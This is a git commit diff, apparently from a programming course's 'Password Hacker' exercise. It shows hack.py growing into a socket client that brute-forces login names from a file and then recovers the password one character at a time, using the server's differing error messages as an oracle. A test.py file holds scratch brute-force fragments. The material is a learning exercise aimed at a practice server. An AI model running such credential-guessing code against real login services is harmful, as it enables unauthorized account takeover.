c7994dc6d57c4fed611c849b92d08e407dd9adf2
Киселёв Дмитрий Андреевич <kiselyov.dmitrij@otr.ru>
2020-11-28 14:09:44 +0300

    step 4/5

--- Password Hacker/hack.py
+++ Password Hacker/hack.py
@@ -1,25 +1,47 @@
 import socket
 from sys import argv
 import itertools
+import json
 
 
 class Client:
-    def __init__(self, host, port, tmp_pass):
+    def __init__(self, host, port, tmp_pass, tmp_login):
         self.host = host
         self.port = int(port)
         self.tmp_pass = tmp_pass
+        self.tmp_login = tmp_login
+        self.password = str()
+        self.string = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+        self.lp_json = {"login": ' ',
+                        "password": ' '}
 
-    def __call__(self):
+    def hack_server(self):
         with socket.socket() as client_socket:
             client_socket.connect((self.host, self.port))
-            for word in password_tmp:
-                mixed_case = map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in word)))
-                for message in mixed_case:
+            for login in self.tmp_login:
+                self.lp_json["login"] = login
+                message = json.dumps(self.lp_json)
+                client_socket.send(message.encode())
+                response = client_socket.recv(1024)
+                response = response.decode()
+                response = json.loads(response)
+                if response['result'] == 'Wrong password!':
+                    break
+
+            while True:
+                for char in self.string:
+                    self.password += char
+                    self.lp_json["password"] = self.password
+                    message = json.dumps(self.lp_json)
                     client_socket.send(message.encode())
                     response = client_socket.recv(1024)
-                    if response.decode() == 'Connection success!':
-                        print(message)
+                    response = response.decode()
+                    response = json.loads(response)
+                    if response['result'] == "Connection success!":
+                        print(json.dumps(self.lp_json))
                         exit()
+                    if response['result'] != "Exception happened during login":
+                        self.password = self.password[:-1]
 
 
 class Password:
@@ -36,9 +58,24 @@ class Password:
         return self.password_tmp
 
 
+class Login:
+    def __init__(self):
+        self.login_tmp = str()
+
+    def parsing_login(self):
+        with open('logins.txt', 'r', encoding='utf-8')as file:
+            for logn in file:
+                self.login_tmp += logn
+            self.login_tmp = self.login_tmp.split('\n')
+
+        return self.login_tmp
+
+
 if __name__ == '__main__':
-    host, port = input(), input()
+    host, port = argv[1:]
+    login_tmp = Login()
+    login_tmp = login_tmp.parsing_login()
     password_tmp = Password()
     password_tmp = password_tmp.parsing_password()
-    run = Client(host, port, password_tmp)
-    run.__call__()
+    run = Client(host, port, password_tmp, login_tmp)
+    run.hack_server()
--- Password Hacker/test.py
+++ Password Hacker/test.py
@@ -1,36 +1,23 @@
+import json
 import itertools
 
-# tmp = str()
-# tmp_pass = 'abcdefghijklmnopqrstuvwxyz0123456789'
-# for i in range(1, 100):
-#     for j in itertools.product(tmp_pass, repeat=i):
-#         tmp = ''.join(j)
-#         if tmp == 'pass':
-#             print(tmp)
-#             break
+tmp = 'a'
+print(tmp[:-1])
 
+string = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
 
-
-
-password_tmp = str()
-with open('file.txt', 'r', encoding='utf-8')as file:
-    for password in file:
-        password_tmp += password
-    password_tmp = password_tmp.split('\n')
-    password_tmp = [x for x in password_tmp if x.isalpha()]
-
-for word in password_tmp:
-    mixed_case = map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in word)))
-    for i in mixed_case:
-        print(i)
-
-# words = map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in password_tmp)))
-# for i in words:
-#     print(i)
 # for word in password_tmp:
-#     src = itertools.product(word.upper(), word.lower())
-# for i in src:
-#     print(i)
+#     mixed_case = map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in word)))
+#     for message in mixed_case:
+#         client_socket.send(message.encode())
+#         response = client_socket.recv(1024)
+#         if response.decode() == 'Connection success!':
+#             print(message)
+#             exit()
 
-
-
+# def brute_force_login(self):
+#     for login in self.tmp_login:
+#         self.lp_json["login"] = login
+#         client_socket.send(message.encode())
+#         response = client_socket.recv(1024)
+#         if response.decode() == 'Connection success!':
